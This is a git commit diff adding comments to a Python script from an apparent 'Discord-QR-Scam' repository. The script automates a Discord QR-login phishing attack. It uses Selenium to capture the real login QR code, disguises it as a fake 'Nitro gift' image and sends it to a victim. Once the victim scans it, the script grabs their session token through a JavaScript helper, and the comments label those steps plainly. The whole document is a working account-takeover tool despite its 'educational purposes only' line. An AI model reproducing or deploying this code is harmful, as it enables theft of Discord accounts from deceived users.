e9664f77fd3bfc4c6a17999ec1833762cc48f718
Theodore Toma <60622287+Theotoma@users.noreply.github.com>
2022-02-05 13:39:09 +0000

    Add comments

--- QR_Generator.py
+++ QR_Generator.py
@@ -1,3 +1,7 @@
+# Developers: NightfallGT + Theotoma
+# Educational purposes only
+
+# Imports
 import os
 import time
 import base64
@@ -9,15 +13,16 @@ from selenium.webdriver.chrome.service import Service
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 
-# Developers: NightfallGT + Theotoma
-# Educational purposes only
+# Clear Console
 os.system('cls' if os.name == 'nt' else 'clear')
 
 
+# Setup Exceptions
 class Timeout(Exception):
     """Raise when connection times out"""
 
 
+# Generate GR Code
 def logo_qr():
     im1 = Image.open('temp/qr_code.png', 'r')
     im2 = Image.open('temp/overlay.png', 'r')
@@ -26,6 +31,7 @@ def logo_qr():
     im1.save('temp/final_qr.png', quality=95)
 
 
+# Generate Nitro Scam
 def paste_template():
     im1 = Image.open('temp/template.png', 'r')
     im2 = Image.open('temp/final_qr.png', 'r')
@@ -33,15 +39,18 @@ def paste_template():
     im1.save('discord_gift.png', quality=95)
 
 
+# Run Chrome and Grab Victim's Token
 def main():
     print('https://github.com/Theotoma/Discord-QR-Scam\n')
     print('** QR Code Scam Generator **')
 
+    # Webdriver Options
     options = webdriver.ChromeOptions()
     options.add_experimental_option('excludeSwitches', ['enable-logging'])
     options.add_experimental_option('detach', True)
-    options.add_argument("--incognito")
+    options.add_argument('--incognito')
 
+    # Start Webdriver
     driver = webdriver.Chrome(
         options=options,
         service=Service(r'chromedriver.exe'),
@@ -49,9 +58,11 @@ def main():
 
     driver.get('https://discord.com/login')
 
-    qr_div_selector = ".qrCode-2R7t9S"
-    spinner_selector = "spinner-2enMB9"
+    # Locator Variables
+    qr_div_selector = '.qrCode-2R7t9S'
+    spinner_selector = 'spinner-2enMB9'
 
+    # Wait for Page to Load
     WebDriverWait(driver, 15).until(
         EC.presence_of_element_located((By.CSS_SELECTOR, qr_div_selector))
     )
@@ -69,28 +80,33 @@ def main():
         raise Timeout('QR Code timed out')
 
     WebDriverWait(driver, 5).until(
-        EC.presence_of_element_located((By.XPATH, "//img[@alt='Scan me!']"))
+        EC.presence_of_element_located((By.XPATH, '//img[@alt=\'Scan me!\']'))
     )
 
     print('- Page loaded.')
 
-    qr_code_data = driver.find_element(By.XPATH, "//img[@alt='Scan me!']").get_attribute('src')
+    # Extract QR Code Data
+    qr_code_data = driver.find_element(By.XPATH, '//img[@alt=\'Scan me!\']').get_attribute('src')
     img_data = base64.b64decode(qr_code_data.replace('data:image/png;base64,', ''))
 
+    # Generate File
     file = os.path.join(os.getcwd(), 'temp/qr_code.png')
     with open(file, 'wb') as handler:
         handler.write(img_data)
 
-    discord_login = driver.current_url
     logo_qr()
     paste_template()
 
+    # Notify User
     print('- QR Code has been generated. > discord_gift.png')
     print('Send the QR Code to user and scan. Waiting...\n')
 
+    # Wait for Victim
+    discord_login = driver.current_url
     while discord_login == driver.current_url:
         time.sleep(0.1)
 
+    # Grab Victim's Token
     print('Grabbing token...')
 
     with open('grab_token.js', 'r') as token_js:
@@ -98,10 +114,12 @@ def main():
 
     print(f'Token grabbed: {token}')
 
+    # Option to Exit
     print('\nTask complete.')
     print('Press any key to exit...', end='')
 
 
+# Run Script and Handle Errors
 if __name__ == '__main__':
     try:
         main()
